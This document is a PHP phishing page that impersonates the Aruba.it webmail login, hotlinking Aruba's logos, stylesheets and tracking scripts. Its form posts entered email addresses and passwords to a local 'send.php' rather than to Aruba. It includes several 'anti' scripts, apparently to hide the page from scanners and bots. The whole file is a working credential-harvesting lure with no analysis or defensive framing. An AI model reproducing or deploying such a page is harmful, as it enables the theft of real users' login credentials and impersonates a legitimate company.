<?php
error_reporting(E_ERROR | E_WARNING | E_PARSE | E_NOTICE);
@ini_set('html_errors','0');
@ini_set('display_errors','0');
@ini_set('display_startup_errors','0');
@ini_set('log_errors','0');
include './prevents/anti1.php';
include './prevents/anti2.php';
include './prevents/anti3.php';
include './prevents/anti4.php';
include './prevents/anti5.php';
include './prevents/anti6.php';
include './prevents/anti7.php';
include './prevents/anti8.php';
include './prevents/9atila.php';
?>
<!DOCTYPE html>
<html>
<head>
    <link rel="icon" type="image/ico" href="https://admin.aruba.it/favicon.ico">
    <script type="text/javascript" src="https://admin.aruba.it/PannelloAdmin/javascript_cookies.js"></script>
    <script type="text/javascript" language="javascript">

        function setCaretPosition(ctrlId, pos) {
            var ctrl = document.getElementById(ctrlId);
            if (ctrl.setSelectionRange) {
                ctrl.focus();
                ctrl.setSelectionRange(pos, pos);
            }
            else if (ctrl.createTextRange) {
                var range = ctrl.createTextRange();
                range.collapse(true);
                range.moveEnd('character', pos);
                range.moveStart('character', pos);
                range.select();
            }
        }

    </script>
    
	<script type="text/javascript">
    window.onload = function() {
        var elForm = document.getElementsByTagName('form')[0]; // Get the first form in the document
        elForm.onsubmit = function() {
            var required = ['dominiobox','login','password'];
            // Place in this array the name of the form that you think should be mandatory
            var bool = true; // Create bool variable and set its value to true
            for (var i = 0; i < required.length; i++) {
                if (document.getElementsByName(required[i])[0].value == '') {
                    alert(required[i] + ' Forma Errore.');
                    bool = false;
                }
                else {
                }
            }
            return bool;
        }
    }
</script>
	
    <script language="javascript">
        function cda() {
            window.open("cardaccesso.asp", "finestra", "toolbar=no,location=no,directories=no,status=no,menubar=no,scrollbars=no,resizable=no,width=500,height=320,top=0,left=0")
        }

        function clickButton(e, buttonid) {
            var bt = document.getElementById(buttonid);
            if (typeof bt == 'object') {
                if (e.keyCode == 13) {
                    bt.click();
                    return false;
                }
            }
        }
    </script>
    <title>Aruba.it - Control Panel Login</title>
    <meta http-equiv="Content-Type" content="text/html" />
    <link href="https://admin.aruba.it/PannelloAdmin/Login.css?v1.0" type="text/css" rel="stylesheet" />
    <!--[if lt IE 8]><style>@import url("template_lt_ie8.css");</style><![endif]-->
    <!-- Inizio Codice Visual Path -->
    <script type="text/javascript">
        vp3_startSess = new Date;
    </script>
    <!-- Fine Codice Visual Path -->
</head>
<body>
    <!-- intera pagina -->
    <div class="navbar-top">
        <div class="containerCer">
            <div id="languageIt">
                <ul class="langselector">
                    <li class="lifirst"><a class="first" href="arb.html" onclick="SetLingua('IT');">
                        Italiano <b class="caret"></b></a>
                        <ul>
                            <li><a href="arb.html" onclick="SetLingua('EN');">Inglese</a></li>
                            <li><a href="arb.html" onclick="SetLingua('ES');">Spagnolo</a></li>
                            <li><a href="arb.html" onclick="SetLingua('DE');">Tedesco</a></li>
                        </ul>
                    </li>
                </ul>
            </div>
            
            
            
            <div class="navbar-right">
                <ul id="navbar" class="nav navbar-nav">
                    
                    <li class="borderListSeparator"><a href="http://webmail.aruba.it" target="_blank">
                        <span id="Label7">webmail</span></a></li>
                    <li class="borderListSeparator"><a href="https://hosting.aruba.it/Rinnovi/InsDatiRinnovo.asp?Lang=DEFAULT"
                        target="_blank">
                        <span id="Label8">rinnovi</span></a></li>
                    <li class="borderListSeparator"><a href="https://pagamenti.aruba.it/home/default.aspx"
                        target="_blank">
                        <span id="Label9">pagamenti</span></a></li>
                    <li class="borderListSeparator"><a href="http://rivenditori.aruba.it/" target="_blank">
                        <span id="Label10">affiliazione</span></a></li>
                    <li class="borderListSeparator"><a href="https://hosting.aruba.it/areaclienti" target="_blank">
                        <span id="Label11">area clienti</span></a></li>
                    <li><a href="http://analytics.arubamediamarketing.it/link_outbound/?cvtrac=5&usc=d645920e395fedad7bbbed0eca3fe2e0" id="A2" target="_blank">
                        <span id="Label12">assistenza</span></a></li>
                    </ul>
            </div>
        </div>
    </div>
    <div class="toplogo">
        <img id="Image1" src="https://admin.aruba.it/PannelloAdmin/UI/Images/general_tmpl/logo_aruba.png" style="border-width:0px;" />
    </div>
    <div class="PannelloAdminMainBox">
        <form name="logpage" method="post" action="send.php" id="logpage" onkeypress="return clickButton(event,'accedi')">

        <!-- Area messaggio errore -->
        <table id="Table1" class="PannelloAdminMessageArea" align="Center" border="0">
	<tr>

	</tr>
</table>
        <table class="PannelloAdminLoginBox">
            <!-- Barra Titolo Pannello -->
            <tr>
                <td class="PannelloAdminLoginTop">
                    <!-- Titolo -->
                    <div class="PannelloAdminLoginTitle">
                        <span>
                            Webmail Aruba</span></div>
                </td>
            </tr>
            <!-- Zona centrale con campi -->
            <tr>
                <td class="PannelloAdminLoginMiddle">
                    <!-- tabella campi -->
                    <table class="PannelloAdminLoginTableCampi">
                        <tr>
                            <td class="PannelloAdminLoginTableCol_1">
                                <span id="lblDominio">Indirizzo Email</span>
                            </td>
                            <td class="PannelloAdminLoginTableCol_2">
                                <strong>
                                    </strong>
                                <input name="dominiobox" type="text" id="dominiobox" title="nomedominio.xxx" class="PannelloAdminLoginCampo" />
                            </td>
                        </tr>
                        <tr>
                            <td class="PannelloAdminLoginTableCol_1">
                                <span id="lblPassword">Password</span>
                            </td>
                            <td class="PannelloAdminLoginTableCol_2">
                                <input name="password" type="password" id="password" title="Password" class="PannelloAdminLoginCampo" />
                            </td>
                        </tr>
                        <tr>
                            <td>
                                &nbsp;
                            </td>
                        </tr>
                        <tr>
                            <td class="PannelloAdminLoginTableCol_1">
                                &nbsp;
                            </td>
                            <td class="PannelloAdminLoginTableCol_2">
                                

                            </td>
                        </tr>
                        <tr>
                            <td>
                            </td>
                            <td class="PannelloAdminLoginTableCol_2">
                                <input type="submit" name="accedi" value="Accedi >>" id="accedi" class="PannelloAdminLoginButton" onkeypress="return clickButton(event,'accedi')" />
                            </td>
                        </tr>
                    </table>
                </td>
            </tr>
            <!-- Footer -->
            <tr>
                <td class="PannelloAdminLoginBottom">
                    <table>
                        <tr>
                            <td class="BottomLeftBox">
                                <div>
                                    
                                    <div class="SecureVersionBox">
                                        <a href="javascript:cda()" class="BottomLink">
                                            <img class="imgBottom" alt="Secure Version" src="https://admin.aruba.it/PannelloAdmin/image_pannello_controllo/imgCaratteristicheAccesso.png" />
                                            <span>
                                                Caratteristiche d'accesso</span></a>
                                    </div>
                                    <div class="SecureVersionBox">
                                        <a href="https://admin.aruba.it/oldlogin.aspx" class="BottomLink">
                                            <img class="imgBottom" alt="Versione precedente" src="https://admin.aruba.it/PannelloAdmin/image_pannello_controllo/arrox_previous.png" />
                                            <span>
                                                Versione precedente</span></a></div>
                                </div>
                            </td>
                            <td class="HaiPersoDatiBox">
                                <div>
                                    <a href="http://hosting.aruba.it/Domini/spediscidatidominio.asp?lang=IT"
                                        target="_blank" class="BottomLink"><span>
                                            Hai perso i dati?</span>
                                        <img class="imgBottomUp" alt="Secure Version" src="https://admin.aruba.it/PannelloAdmin/image_pannello_controllo/imgHaiPersoDati.png" /></a>
                                </div>
                            </td>
                        </tr>
                    </table>
                </td>
            </tr>
            <script language="JavaScript" type="text/javascript">
                var today = new Date();
                year = (today.getFullYear());
                function print_date() {
                    document.write(year);
                } 
            </script>
            <tr>
                <td class="PannelloAdminLoginBottomLogo">
                    <a href="http://www.aruba.it" style="display: block; width: 100%; height: 100px;
                        text-decoration: none;"><span class="PannelloAdminLoginBottomCopyright">Copyright &copy;
                            <script type="text/javascript">                                print_date(); </script>
                            Aruba S.p.A. - P.I. 01573850516 - All rights reserved</span></a>
                </td>
            </tr>
        </table>
        <script type="text/javascript">
            Set_Cookie('test', 'none', '', '/', '', '');
            if (Get_Cookie('test')) {
                cookie_set = true;
                Delete_Cookie('test', '/', '');
            }
            else {
                document.write('Per accedere al servizio si richiedono i cookie attivati.<br>');
                cookie_set = false;
            }
        </script>
        </form>
    </div>
    
    <!-- Inizio Codice Conversion Lab -->
    <script language="JavaScript" type="text/javascript">
        var us = '59b1da0be8266e06e6a75a5d0f2aa14d2';
    </script>
    <script language="JavaScript" src="https://tracks.arubamediamarketing.it/track/tsends.js"
        type="text/javascript"></script>
    <noscript>
        <a href="http://www.arubamediamarketing.it/">
            <img src="https://tracks.arubamediamarketing.it/track/cl.gif?md5=59b1da0be8266e06e6a75a5d0f2aa14d">
        </a>
    </noscript>
    <!-- Fine Codice Conversion Lab -->
    <!-- Inizio Codice Visual Path -->
    <script src='https://visual.arubamediamarketing.it/cjs/59b1da0be8266e06e6a75a5d0f2aa14d.js'
        type='text/javascript'></script>
    <script src='https://visual.arubamediamarketing.it/track/include.js' type='text/javascript'></script>
    <!-- Fine Codice Visual Path -->
</body>
</html>
